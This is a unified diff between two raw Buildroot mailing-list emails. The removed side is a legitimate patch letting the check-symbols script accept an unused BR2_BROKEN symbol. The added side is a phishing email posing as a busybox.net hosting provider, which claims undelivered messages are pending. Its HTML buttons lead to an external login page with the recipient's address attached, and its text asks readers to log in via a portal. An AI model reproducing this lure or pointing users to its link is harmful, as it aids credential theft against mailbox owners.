@@ -4,69 +4,48 @@ X-Spam-Checker-Version: SpamAssassin 3.4.0 (2014-02-07) on
 Received: from smtp1.osuosl.org (smtp1.osuosl.org [140.211.166.138])
 	(using TLSv1.2 with cipher ECDHE-RSA-AES256-GCM-SHA384 (256/256 bits))
 	(No client certificate requested)
-	by smtp.lore.kernel.org (Postfix) with ESMTPS id 5D7FCC02182
-	for <buildroot@archiver.kernel.org>; Thu, 23 Jan 2025 21:35:57 +0000 (UTC)
+	by smtp.lore.kernel.org (Postfix) with ESMTPS id 7E453C02182
+	for <buildroot@archiver.kernel.org>; Fri, 24 Jan 2025 02:31:56 +0000 (UTC)
 Received: from localhost (localhost [127.0.0.1])
-	by smtp1.osuosl.org (Postfix) with ESMTP id 1401285089;
-	Thu, 23 Jan 2025 21:35:57 +0000 (UTC)
+	by smtp1.osuosl.org (Postfix) with ESMTP id DF653850FD;
+	Fri, 24 Jan 2025 02:31:55 +0000 (UTC)
 X-Virus-Scanned: amavis at osuosl.org
 Received: from smtp1.osuosl.org ([127.0.0.1])
  by localhost (smtp1.osuosl.org [127.0.0.1]) (amavis, port 10024) with ESMTP
- id RDIq_qxKK1_k; Thu, 23 Jan 2025 21:35:56 +0000 (UTC)
+ id ErOuLMyG2RFa; Fri, 24 Jan 2025 02:31:55 +0000 (UTC)
 X-Comment: SPF check N/A for local connections - client-ip=140.211.166.142; helo=lists1.osuosl.org; envelope-from=buildroot-bounces@buildroot.org; receiver=<UNKNOWN> 
-DKIM-Filter: OpenDKIM Filter v2.11.0 smtp1.osuosl.org 2A2778509D
+DKIM-Filter: OpenDKIM Filter v2.11.0 smtp1.osuosl.org 0E728850FE
 Received: from lists1.osuosl.org (lists1.osuosl.org [140.211.166.142])
-	by smtp1.osuosl.org (Postfix) with ESMTP id 2A2778509D;
-	Thu, 23 Jan 2025 21:35:56 +0000 (UTC)
+	by smtp1.osuosl.org (Postfix) with ESMTP id 0E728850FE;
+	Fri, 24 Jan 2025 02:31:55 +0000 (UTC)
 Received: from smtp1.osuosl.org (smtp1.osuosl.org [IPv6:2605:bc80:3010::138])
- by lists1.osuosl.org (Postfix) with ESMTP id D5676B88
- for <buildroot@buildroot.org>; Thu, 23 Jan 2025 21:35:53 +0000 (UTC)
+ by lists1.osuosl.org (Postfix) with ESMTP id D4DFF959
+ for <buildroot@buildroot.org>; Fri, 24 Jan 2025 02:31:53 +0000 (UTC)
 Received: from localhost (localhost [127.0.0.1])
- by smtp1.osuosl.org (Postfix) with ESMTP id C38D28509F
- for <buildroot@buildroot.org>; Thu, 23 Jan 2025 21:35:53 +0000 (UTC)
+ by smtp1.osuosl.org (Postfix) with ESMTP id D00B1850FC
+ for <buildroot@buildroot.org>; Fri, 24 Jan 2025 02:31:53 +0000 (UTC)
 X-Virus-Scanned: amavis at osuosl.org
 Received: from smtp1.osuosl.org ([127.0.0.1])
  by localhost (smtp1.osuosl.org [127.0.0.1]) (amavis, port 10024) with ESMTP
- id DGs8NLB5ySeE for <buildroot@buildroot.org>;
- Thu, 23 Jan 2025 21:35:53 +0000 (UTC)
-Received-SPF: Pass (mailfrom) identity=mailfrom; client-ip=2a01:e0c:1:1599::10;
- helo=smtp1-g21.free.fr; envelope-from=ju.o@free.fr; receiver=<UNKNOWN> 
-DMARC-Filter: OpenDMARC Filter v1.4.2 smtp1.osuosl.org D2F9B8509D
-DKIM-Filter: OpenDKIM Filter v2.11.0 smtp1.osuosl.org D2F9B8509D
-Received: from smtp1-g21.free.fr (smtp1-g21.free.fr [IPv6:2a01:e0c:1:1599::10])
- by smtp1.osuosl.org (Postfix) with ESMTPS id D2F9B8509D
- for <buildroot@buildroot.org>; Thu, 23 Jan 2025 21:35:52 +0000 (UTC)
-Received: from home.juju.sh (unknown
- [IPv6:2a01:e0a:485:b220:8213:2270:4a8d:a1d5])
- (Authenticated sender: ju.o@free.fr)
- by smtp1-g21.free.fr (Postfix) with ESMTPSA id 1F6F9B00535;
- Thu, 23 Jan 2025 22:35:48 +0100 (CET)
-From: Julien Olivain <ju.o@free.fr>
-To: buildroot@buildroot.org
-Cc: Ricardo Martincoski <ricardo.martincoski@datacom.com.br>,
- Julien Olivain <ju.o@free.fr>
-Date: Thu, 23 Jan 2025 22:35:41 +0100
-Message-ID: <20250123213541.1737622-1-ju.o@free.fr>
-X-Mailer: git-send-email 2.48.1
+ id WExZiTuyOtdX for <buildroot@buildroot.org>;
+ Fri, 24 Jan 2025 02:31:51 +0000 (UTC)
+Received-SPF: Softfail (mailfrom) identity=mailfrom; client-ip=192.227.246.67;
+ helo=busybox.net; envelope-from=buildroot@busybox.net; receiver=<UNKNOWN> 
+DMARC-Filter: OpenDMARC Filter v1.4.2 smtp1.osuosl.org 97463850F5
+DKIM-Filter: OpenDKIM Filter v2.11.0 smtp1.osuosl.org 97463850F5
+Received: from busybox.net (unknown [192.227.246.67])
+ by smtp1.osuosl.org (Postfix) with ESMTP id 97463850F5
+ for <buildroot@busybox.net>; Fri, 24 Jan 2025 02:31:51 +0000 (UTC)
+From: busybox.net Host Provider <buildroot@busybox.net>
+To: buildroot@busybox.net
+Date: 24 Jan 2025 03:31:51 +0100
+Message-ID: <20250124033151.C56C03CBEE3F1F11@busybox.net>
 MIME-Version: 1.0
-X-Mailman-Original-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/simple;
- d=free.fr; s=smtp-20201208; t=1737668150;
- bh=tA7ix42g67aLHhu/DETuJlSmIJAPlPqZiHQLhp/NobA=;
- h=From:To:Cc:Subject:Date:From;
- b=UN6eXWMoYctY5opBWf5Uam3efnRSHfJSP0hON7DppOfzyGIas9sdT6N7Fv/AJTFji
- ojrEPvnCkjUVZCku6iySCJiyhy5BciqjEa/his2yWQKyTO0dIysubNzXzSu1aaGphI
- yzwWxzYFA+HjORhtVmI82gG9jketmdAwVxD+SjjrUARSv6E6FoVDS9PdUcihI/U1ni
- BltQGbGLccJsVBF5M/stDCZNXJSinYk4T884FIDEUzh71DhSyur4ZAfEutSXlaaLr/
- 64eeT065r5uuW/y4ChcZ6IyIUotLGfXf8vmQ59wWODOvFvazY/FKXZwbMIuOm0VKao
- d9qSsMkRr8bVA==
 X-Mailman-Original-Authentication-Results: smtp1.osuosl.org;
- dmarc=pass (p=none dis=none)
- header.from=free.fr
-X-Mailman-Original-Authentication-Results: smtp1.osuosl.org;
- dkim=pass (2048-bit key) header.d=free.fr header.i=@free.fr
- header.a=rsa-sha256 header.s=smtp-20201208 header.b=UN6eXWMo
-Subject: [Buildroot] [PATCH 1/1] utils/check-symbols: allow BR2_BROKEN to be
- unused
+ dmarc=none (p=none dis=none)
+ header.from=busybox.net
+Subject: [Buildroot] buildroot@busybox.net (15) Important messages still
+ pending to be delivered to your inbox
 X-BeenThere: buildroot@buildroot.org
 X-Mailman-Version: 2.1.30
 Precedence: list
@@ -78,74 +57,191 @@ List-Post: <mailto:buildroot@buildroot.org>
 List-Help: <mailto:buildroot-request@buildroot.org?subject=help>
 List-Subscribe: <https://lists.buildroot.org/mailman/listinfo/buildroot>,
  <mailto:buildroot-request@buildroot.org?subject=subscribe>
-Content-Type: text/plain; charset="us-ascii"
-Content-Transfer-Encoding: 7bit
+Content-Type: multipart/mixed; boundary="===============3803944832578025554=="
 Errors-To: buildroot-bounces@buildroot.org
 Sender: "buildroot" <buildroot-bounces@buildroot.org>
 
-Commit [1] introduced the BR2_BROKEN hidden symbol. The intent of
-this symbol is to temporarily mark a configuration known to be broken.
-This commit was added to fix an undefined usage of the symbol, in a
-previous commit [2].
+--===============3803944832578025554==
+Content-Type: text/html;
+	charset="iso-8859-1"
+Content-Transfer-Encoding: quoted-printable
 
-With this somewhat special symbol, it is also perfectly normal to
-have no use of it.
+<!DOCTYPE HTML>
 
-Running the command "utils/check-symbols" in a state there is no usage
-of the BR2_BROKEN, the script fails with output:
+<html><head><title></title>
+<meta http-equiv=3D"X-UA-Compatible" content=3D"IE=3Dedge">
+</head>
+<body style=3D"margin: 0.4em;">
+<table style=3D"border: 1px dotted rgb(211, 211, 211); border-image: none; =
+text-align: left; color: rgb(51, 51, 51); text-transform: none; letter-spac=
+ing: normal; font-family: Roboto, Tahoma, Helvetica, sans-serif; font-size:=
+ 13px; font-style: normal; font-weight: 400; word-spacing: 0px; white-space=
+: normal; border-collapse: collapse; orphans: 2; widows: 2; background-colo=
+r: rgb(255, 255, 255); font-variant-ligatures: normal; font-variant-caps: n=
+ormal; -webkit-text-stroke-width: 0px;=20
+text-decoration-thickness: initial; text-decoration-style: initial; text-de=
+coration-color: initial;"><tbody><tr><th style=3D"padding: 5px; border: 0px=
+ solid rgb(0, 0, 0); border-image: none; width: 2px; color: rgb(0, 0, 0); b=
+ackground-color: rgb(2, 151, 64);">&nbsp;</th><td style=3D"margin: 0px; pad=
+ding: 5px; border: 0px solid rgb(0, 0, 0); border-image: none; width: 665px=
+; color: rgb(0, 0, 0); font-family: Roboto, Tahoma, Helvetica, sans-serif; =
+background-color: rgb(243, 255, 248);">
+<span style=3D"font-size: 12px;">From&nbsp;busybox.net Server Admin<br></sp=
+an></td>
+</tr></tbody></table>
+<div style=3D"width: 700px; text-align: left; color: rgb(0, 0, 0); text-tra=
+nsform: none; text-indent: 0px; letter-spacing: normal; font-family: Roboto=
+, Tahoma, Helvetica, sans-serif; font-size: 12px; font-style: normal; font-=
+weight: 400; word-spacing: 0px; white-space: normal; orphans: 2; widows: 2;=
+ background-color: rgb(255, 255, 255); font-variant-ligatures: normal; font=
+-variant-caps: normal; -webkit-text-stroke-width: 0px; text-decoration-thic=
+kness: initial; text-decoration-style: initial;=20
+text-decoration-color: initial;"><br><br>You have&nbsp;[15] messages still =
+pending to be delivered to your inbox and failed to deliver to your receipi=
+ents<br><br><strong>Mailbox:&nbsp;</strong><a style=3D"color: rgb(17, 85, 2=
+04);" href=3D"mailto:va@kant.ru" target=3D"_blank"><strong><u>buildroot@bus=
+ybox.net</u></strong></a><br><br></div>
+<div style=3D"text-align: left; color: rgb(34, 34, 34); text-transform: non=
+e; text-indent: 0px; letter-spacing: normal; font-family: Arial, Helvetica,=
+ sans-serif; font-size: 14px; font-style: normal; font-weight: 400; word-sp=
+acing: 0px; white-space: normal; orphans: 2; widows: 2; background-color: r=
+gb(255, 255, 255); font-variant-ligatures: normal; font-variant-caps: norma=
+l; -webkit-text-stroke-width: 0px; text-decoration-thickness: initial; text=
+-decoration-style: initial; text-decoration-color:=20
+initial;" dir=3D"ltr"><table style=3D"width: 700px; height: 208px; color: r=
+gb(0, 0, 0); font-size: 15px; border-collapse: collapse;" border=3D"0" cell=
+spacing=3D"2" cellpadding=3D"2"><tbody><tr><td style=3D"margin: 0px; width:=
+ 340px; font-family: Calibri; background-color: rgb(243, 255, 248);"><stron=
+g style=3D"font-weight: bolder;">
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nb=
+sp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;=
+&nbsp;&nbsp;&nbsp;Subject</strong></td><td style=3D"margin: 0px; width: 230=
+px; font-family: Calibri; background-color: rgb(243, 255, 248);"><strong st=
+yle=3D"font-weight: bolder;">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Reci=
+pient</strong></td><td style=3D"margin: 0px; width: 150px; font-family: Cal=
+ibri; background-color: rgb(243, 255, 248);">
+<strong style=3D"font-weight: bolder;">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;=
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Date</strong></td></tr><tr>=
+<td style=3D"margin: 0px; width: 340px; font-family: Calibri; background-co=
+lor: rgb(204, 204, 255);">
+&nbsp;&nbsp;<img class=3D"an1_mr_css_attr" style=3D"width: 1.2em; height: 1=
+=2E2em; vertical-align: middle;" draggable=3D"false" aria-label=3D"&#9888;&=
+#65039;" alt=3D"&#9888;&#65039;" src=3D"https://proxy.imgsmail.ru/?e=3D1733=
+754948&amp;email=3Ds.kolosova%40kant.ru&amp;flags=3D1&amp;h=3Dx_XehbzwQg8lf=
+KQqy4pIIw&amp;is_https=3D1&amp;url173=3DZm9udHMuZ3N0YXRpYy5jb20vcy9lL25vdG9=
+lbW9qaS8xNS4xLzI2YTBfZmUwZi83Mi5wbmc~" loading=3D"lazy"><span>&nbsp;</span>=
+FW: Invoice copy</td>
+<td style=3D"margin: 0px; width: 230px; font-family: Calibri; background-co=
+lor: rgb(204, 204, 255);">&nbsp;&nbsp;&nbsp;&nbsp;To:<span>&nbsp;buildroot@=
+busybox.net</span></td><td style=3D"margin: 0px; width: 150px; font-family:=
+ Calibri; background-color: rgb(204, 204, 255);">&nbsp;&nbsp;&nbsp;&nbsp;&n=
+bsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 1/24/2025 3:31:51 a.m..</td></tr><=
+tr><td style=3D"margin: 0px; width: 340px; font-family: Calibri; background=
+-color: rgb(204, 204, 255);">
+&nbsp;&nbsp;<img class=3D"an1_mr_css_attr" style=3D"width: 1.2em; height: 1=
+=2E2em; vertical-align: middle;" draggable=3D"false" aria-label=3D"&#9888;&=
+#65039;" alt=3D"&#9888;&#65039;" src=3D"https://proxy.imgsmail.ru/?e=3D1733=
+754948&amp;email=3Ds.kolosova%40kant.ru&amp;flags=3D1&amp;h=3Dx_XehbzwQg8lf=
+KQqy4pIIw&amp;is_https=3D1&amp;url173=3DZm9udHMuZ3N0YXRpYy5jb20vcy9lL25vdG9=
+lbW9qaS8xNS4xLzI2YTBfZmUwZi83Mi5wbmc~" loading=3D"lazy"><span>&nbsp;</span>=
+Signed Contract</td>
+<td style=3D"margin: 0px; width: 230px; font-family: Calibri; background-co=
+lor: rgb(204, 204, 255);">&nbsp;&nbsp;&nbsp;&nbsp;To:<span>&nbsp;buildroot@=
+busybox.net</span></td><td style=3D"margin: 0px; width: 150px; font-family:=
+ Calibri; background-color: rgb(204, 204, 255);">&nbsp;&nbsp;&nbsp;&nbsp;&n=
+bsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 1/24/2025 3:31:51 a.m.=
+=2E</td></tr><tr><td style=3D"margin: 0px; width: 340px; font-family: Calib=
+ri; background-color: rgb(204, 204, 255);">
+&nbsp;&nbsp;<img class=3D"an1_mr_css_attr" style=3D"width: 1.2em; height: 1=
+=2E2em; vertical-align: middle;" draggable=3D"false" aria-label=3D"&#9888;&=
+#65039;" alt=3D"&#9888;&#65039;" src=3D"https://proxy.imgsmail.ru/?e=3D1733=
+754948&amp;email=3Ds.kolosova%40kant.ru&amp;flags=3D1&amp;h=3Dx_XehbzwQg8lf=
+KQqy4pIIw&amp;is_https=3D1&amp;url173=3DZm9udHMuZ3N0YXRpYy5jb20vcy9lL25vdG9=
+lbW9qaS8xNS4xLzI2YTBfZmUwZi83Mi5wbmc~" loading=3D"lazy">&nbsp;BL Copy, Comm=
+ercial Invoice</td>
+<td style=3D"margin: 0px; width: 230px; font-family: Calibri; background-co=
+lor: rgb(204, 204, 255);">&nbsp;&nbsp;&nbsp;&nbsp;To:<span><span>&nbsp;</sp=
+an>&nbsp;buildroot@busybox.net</span></td><td style=3D"margin: 0px; width: =
+150px; font-family: Calibri; background-color: rgb(204, 204, 255);">&nbsp;&=
+nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 1/2=
+4/2025 3:31:51 a.m..</td></tr><tr><td style=3D"margin: 0px; width: 340px; f=
+ont-family: Calibri; background-color: rgb(204, 204, 255);">
+&nbsp;&nbsp;<img class=3D"an1_mr_css_attr" style=3D"width: 1.2em; height: 1=
+=2E2em; vertical-align: middle;" draggable=3D"false" aria-label=3D"&#9888;&=
+#65039;" alt=3D"&#9888;&#65039;" src=3D"https://proxy.imgsmail.ru/?e=3D1733=
+754948&amp;email=3Ds.kolosova%40kant.ru&amp;flags=3D1&amp;h=3Dx_XehbzwQg8lf=
+KQqy4pIIw&amp;is_https=3D1&amp;url173=3DZm9udHMuZ3N0YXRpYy5jb20vcy9lL25vdG9=
+lbW9qaS8xNS4xLzI2YTBfZmUwZi83Mi5wbmc~" loading=3D"lazy"><span>&nbsp;</span>=
+Re: Request for quote</td>
+<td style=3D"margin: 0px; width: 230px; font-family: Calibri; background-co=
+lor: rgb(204, 204, 255);">&nbsp;&nbsp;&nbsp;&nbsp;To:<span>&nbsp;buildroot@=
+busybox.net</span></td><td style=3D"margin: 0px; width: 150px; font-family:=
+ Calibri; background-color: rgb(204, 204, 255);">&nbsp;&nbsp;&nbsp;&nbsp;&n=
+bsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 1/24/2025 3:31:51 a.m.=
+=2E</td></tr><tr><td style=3D"margin: 0px; width: 340px; font-family: Calib=
+ri; background-color: rgb(204, 204, 255);">
+&nbsp;&nbsp;<img class=3D"an1_mr_css_attr" style=3D"width: 1.2em; height: 1=
+=2E2em; vertical-align: middle;" draggable=3D"false" aria-label=3D"&#9888;&=
+#65039;" alt=3D"&#9888;&#65039;" src=3D"https://proxy.imgsmail.ru/?e=3D1733=
+754948&amp;email=3Ds.kolosova%40kant.ru&amp;flags=3D1&amp;h=3Dx_XehbzwQg8lf=
+KQqy4pIIw&amp;is_https=3D1&amp;url173=3DZm9udHMuZ3N0YXRpYy5jb20vcy9lL25vdG9=
+lbW9qaS8xNS4xLzI2YTBfZmUwZi83Mi5wbmc~" loading=3D"lazy"><span>&nbsp;</span>=
+Fwd: Payment ---- Forwarded message ----</td>
+<td style=3D"margin: 0px; width: 230px; font-family: Calibri; background-co=
+lor: rgb(204, 204, 255);">&nbsp;&nbsp;&nbsp;&nbsp;To:<span>&nbsp;buildroot@=
+busybox.net</span></td><td style=3D"margin: 0px; width: 150px; font-family:=
+ Calibri; background-color: rgb(204, 204, 255);">&nbsp;&nbsp;&nbsp;&nbsp;&n=
+bsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 1/24/2025 3:31:51 a.m..</td>=
+</tr><tr><td style=3D"margin: 0px; width: 340px; font-family: Calibri; back=
+ground-color: rgb(204, 204, 255);">
+&nbsp;&nbsp;<img class=3D"an1_mr_css_attr" style=3D"width: 1.2em; height: 1=
+=2E2em; vertical-align: middle;" draggable=3D"false" aria-label=3D"&#9888;&=
+#65039;" alt=3D"&#9888;&#65039;" src=3D"https://proxy.imgsmail.ru/?e=3D1733=
+754948&amp;email=3Ds.kolosova%40kant.ru&amp;flags=3D1&amp;h=3Dx_XehbzwQg8lf=
+KQqy4pIIw&amp;is_https=3D1&amp;url173=3DZm9udHMuZ3N0YXRpYy5jb20vcy9lL25vdG9=
+lbW9qaS8xNS4xLzI2YTBfZmUwZi83Mi5wbmc~" loading=3D"lazy"><span>&nbsp;</span>=
+COVID-19 Safety Measures</td>
+<td style=3D"margin: 0px; width: 230px; font-family: Calibri; background-co=
+lor: rgb(204, 204, 255);">&nbsp;&nbsp;&nbsp;&nbsp;To:<span>&nbsp;buildroot@=
+busybox.net</span></td><td style=3D"margin: 0px; width: 160px; font-family:=
+ Calibri; background-color: rgb(204, 204, 255);"><span>&nbsp;&nbsp;&nbsp;&n=
+bsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 1/24/2025 3:31:51 a.m.=
+</span></td></tr></tbody></table><div style=3D"margin: 0px;">&nbsp;</div><o=
+l style=3D"padding: 30px; margin-top: 0px;">
+<li style=3D"margin-left: 15px;"><a title=3D"This external link opens in a =
+new window" style=3D"background: rgb(80, 110, 216); padding: 10px; border-r=
+adius: 2px; color: rgb(255, 255, 255); text-decoration: none;" href=3D"http=
+s://venturasteels.com/wp_/ind.html#buildroot@busybox.net" target=3D"_blank"=
+ rel=3D" noopener noreferrer">Release Pending Mails to inbox</a><br><br><br=
+></li><li style=3D"margin-left: 15px;">
+<a title=3D"This external link opens in a new window" style=3D"background: =
+rgb(212, 0, 0); padding: 10px; border-radius: 2px; color: rgb(255, 255, 255=
+); text-decoration: none;" href=3D"https://venturasteels.com/wp_/ind.html#b=
+uildroot@busybox.net" target=3D"_blank" rel=3D" noopener noreferrer">Report=
+ Error To IT Help Desk</a></li></ol><div style=3D"margin: 0px; font-family:=
+ arial, helvetica, sans-serif;"><br><br>
+<div style=3D"color: rgb(34, 34, 34); text-transform: none; text-indent: 0p=
+x; letter-spacing: normal; font-family: Arial, Helvetica, sans-serif; font-=
+size: small; font-style: normal; font-weight: 400; word-spacing: 0px; font-=
+variant-ligatures: normal; font-variant-caps: normal; text-decoration-style=
+: initial; text-decoration-color: initial;" dir=3D"ltr"><span style=3D"colo=
+r: rgb(0, 0, 0); font-family: Calibri; font-size: 14px;">
+You will receive pending emails after successful login via portal as we apo=
+logize for the inconvenience.</span></div></div></div><p>
+</p>
 
-    Config.in:15: BR2_BROKEN defined but not referenced
 
-This commit adds an exception for this symbol, allowing it to be
-unused in the whole Buildroot tree.
+</body></html>
 
-Fixes:
-https://gitlab.com/buildroot.org/buildroot/-/jobs/8925433382
-
-[1] https://gitlab.com/buildroot.org/buildroot/-/commit/2ddc5808cd19f577917566ad83e2a3835d6d43b9
-[2] https://gitlab.com/buildroot.org/buildroot/-/commit/11a8cdd2bbbd0ef4adf600e4792d75f6f2122ec8
-
-Signed-off-by: Julien Olivain <ju.o@free.fr>
----
-Patch tested in:
-https://gitlab.com/jolivain/buildroot/-/jobs/8937458243
----
- utils/checksymbolslib/br.py | 4 ++++
- utils/checksymbolslib/db.py | 2 ++
- 2 files changed, 6 insertions(+)
-
-diff --git a/utils/checksymbolslib/br.py b/utils/checksymbolslib/br.py
-index f9dc336e64..a4c1b84c56 100644
---- a/utils/checksymbolslib/br.py
-+++ b/utils/checksymbolslib/br.py
-@@ -45,6 +45,10 @@ symbols_not_defined_for_fake_virtual_packages = [
-     'BR2_PACKAGE_PROVIDES_TOOLCHAIN_BUILDROOT',
-     'BR2_PACKAGE_PROVIDES_TOOLCHAIN_BARE_METAL_BUILDROOT',
- ]
-+# Config.in
-+symbols_possibly_unused = [
-+    'BR2_BROKEN',
-+]
- # fs/common.mk
- suffixes_not_defined_for_all_rootfs_types = [
-     '_BZIP2',
-diff --git a/utils/checksymbolslib/db.py b/utils/checksymbolslib/db.py
-index 71b1e9e816..cb0dfa476f 100644
---- a/utils/checksymbolslib/db.py
-+++ b/utils/checksymbolslib/db.py
-@@ -155,6 +155,8 @@ class DB:
-                 continue
-             if legacy_usage in entries:
-                 continue
-+            if symbol in br.symbols_possibly_unused:
-+                continue
-             if symbol in br.symbols_used_only_in_source_code:
-                 continue
-             if symbol in br.symbols_used_only_for_host_variant:
--- 
-2.48.1
+--===============3803944832578025554==
+Content-Type: text/plain; charset="us-ascii"
+MIME-Version: 1.0
+Content-Transfer-Encoding: 7bit
+Content-Disposition: inline
 
 _______________________________________________
 buildroot mailing list
 buildroot@buildroot.org
 https://lists.buildroot.org/mailman/listinfo/buildroot
+
+--===============3803944832578025554==--
